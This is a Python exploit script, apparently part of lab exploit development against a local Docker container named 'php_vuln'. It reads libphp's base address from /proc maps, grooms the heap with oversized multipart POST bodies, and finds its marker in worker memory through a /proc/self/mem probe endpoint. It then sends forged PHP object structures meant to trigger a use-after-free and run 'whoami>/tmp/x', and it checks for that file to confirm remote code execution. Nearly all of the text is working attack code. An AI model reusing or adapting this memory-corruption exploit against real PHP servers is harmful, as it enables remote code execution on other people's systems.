#!/usr/bin/env python3
"""oom110: aim the FAT body at ITS OWN values (measure V_fat live).

Tonight's last gap: OBJ was aimed at the warm-up arena (V_warm), but
the fat request's walk reads ITS OWN freshly allocated values region
(V_fat != V_warm — 13.6MB parse allocates new regions). Fix: measure
V_fat directly.

cycle:
  1. fire fat body with MARKER block (searchable string in every value
     tile at fixed offset) — its walk is benign (marker not a pointer)
  2. probe /proc/self/mem for the MARKER -> VAs of this worker's fat
     value copies -> V_fat = first hit + MARKOFF
  3. fire fat body #2 with OBJ = V_fat + BOFF (3-bit law), block at
     BOFF in every value tile -> ITS OWN walk decrements ITS OWN rc
  4. same worker throughout (no crash before fat2) -> VAs valid
"""
import struct, subprocess, time, re, urllib.request, urllib.error
import payload68

HOST = "http://127.0.0.1:8081"
OUT = lambda s: print(s, flush=True)

def sh(cmd, timeout=90):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=timeout).stdout.strip()

def get(url, timeout=40):
    try:
        return urllib.request.urlopen(url, timeout=timeout).read().decode("utf8", "replace")
    except Exception as e:
        return "ERR %s" % e

def post(url, body, ctype=None, timeout=150):
    req = urllib.request.Request(HOST + url, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return str(r.status), r.read(120)
    except urllib.error.HTTPError as e:
        return str(e.code), e.read(120)
    except Exception as e:
        return "ERR", repr(e).encode()

BASE = None
for ln in sh("docker exec php_vuln sh -c 'cat /proc/1/maps'").splitlines():
    if "libphp.so" in ln:
        BASE = int(ln.split("-")[0], 16)
        break
OUT("    libphp=0x%x" % BASE)
assert BASE and BASE > 0x7f0000000000

ZIF = 0x39b8a0
TILE = 176
MAXT = 1537
MARKER = b"QMARK7XY" * 3       # 24B: passes probe's >=16-byte needle guard
MOFF = 1104                   # marker offset inside the tile (even, clear)

def gs_block():
    hdr = struct.pack("<IIQQ", 1, 0x106, 0, 13)
    s = b"whoami>/tmp/x\x00"
    return hdr + s + b"\x00" * ((-(24 + len(s))) % 8)

def build_tile(OBJ, BOFF, real):
    """real=False -> marker block (measurement); True -> live block."""
    B = bytearray(TILE)
    if real:
        struct.pack_into("<II", B, 0x00, 1, 0x108)
        struct.pack_into("<II", B, 0x08, 1, 0)
        struct.pack_into("<Q",  B, 0x10, 0)
        struct.pack_into("<I",  B, 0x2C, 1)
        B[0x18:0x20] = struct.pack("<Q", OBJ + 0x90)
        B[0x50:0x58] = struct.pack("<Q", OBJ + 0x68)
        B[0x58:0x5C] = struct.pack("<I", 6)
        B[0x68:0x68 + 40] = gs_block()
        B[0x90:0xA0] = struct.pack("<QQ", 0, BASE + ZIF)
    else:
        B[0:24] = MARKER + b"\x00" * 17        # searchable, benign
    T = bytearray(MAXT)
    if real:
        grid = (8 - ((OBJ - BOFF) % 8)) % 8    # slots VA-8-aligned
        for off in range(0, BOFF - 8, 8):
            struct.pack_into("<Q", T, off, OBJ)
        for off in range(BOFF + TILE, MAXT - 8, 8):
            struct.pack_into("<Q", T, off, OBJ)
    else:
        for off in range(0, BOFF - 8, 8):
            struct.pack_into("<Q", T, off, 0x414141414141)  # AAAA filler
    T[BOFF:BOFF + TILE] = B
    T[MOFF:MOFF + len(MARKER)] = MARKER        # marker in BOTH variants
    return bytes(T)

def probe_copies(needle, maxc=8):
    h = needle.hex()
    for a in range(6):
        out = get("%s?h=%s&chunk=262144&maxc=%d" % (HOST + "/oom_probe.php", h, maxc), timeout=40)
        if out.startswith("ERR") or "Fatal" in out:
            time.sleep(0.5); continue
        m = re.search(r"R=(\d+) d=([0-9a-f ]+)", out)
        if m:
            return [int(x, 16) for x in m.group(2).split()]
    return []

def find_aim(offs):
    """OBJ = marker VA + MOFF-BOFF adjustments; 3-bit law on OBJ VA."""
    for vm in offs:                     # vm = VA of MARKER within a value
        b0 = vm - MOFF                  # VA of value0 (tile start)
        for BOFF in range(500, MAXT - TILE):
            x = b0 + BOFF
            if (x & 0xF) == 8 and ((x >> 8) & 1) == 1 and ((x >> 9) & 1) == 0:
                return b0, x, BOFF
    return None, None, None

def check_x(tag):
    x = sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'")
    if "No such" not in x:
        OUT("    *** %s: /tmp/x EXISTS: %r" % (tag, x))
        return True
    return False

stamp = 6300000
for cyc in range(3):
    OUT("-- cycle %d --" % cyc)
    # 1. measurement fat body
    mtile = build_tile(0, 670, real=False)
    body = payload68.build_attack(3400, stamp, value_tile=mtile)
    code, resp = post("/oom_mod.php", body, ctype="multipart/form-data; boundary=BOUND")
    OUT("    fat-m: %s" % code)
    if check_x("fat-m"):
        raise SystemExit("*** RCE CONFIRMED? ***")
    # 2. measure V_fat via marker
    offs = probe_copies(MARKER, maxc=8)
    OUT("    markers=%s" % ([hex(o) for o in offs[:4]],))
    if not offs:
        continue
    b0, OBJ, BOFF = find_aim(offs)
    OUT("    b0=%s OBJ=%s BOFF=%s" % (hex(b0) if b0 else None,
        hex(OBJ) if OBJ else None, BOFF))
    if not OBJ:
        continue
    # 3. aimed fat body
    stamp += 137
    tile = build_tile(OBJ, BOFF, real=True)
    body2 = payload68.build_attack(3400, stamp, value_tile=tile)
    code, resp = post("/oom_mod.php", body2, ctype="multipart/form-data; boundary=BOUND")
    OUT("    fat-aim: %s" % code)
    if check_x("fat-aim"):
        raise SystemExit("*** RCE CONFIRMED ***")
    if code == "ERR":
        time.sleep(4)
OUT("done; /tmp/x=%s" % sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'"))
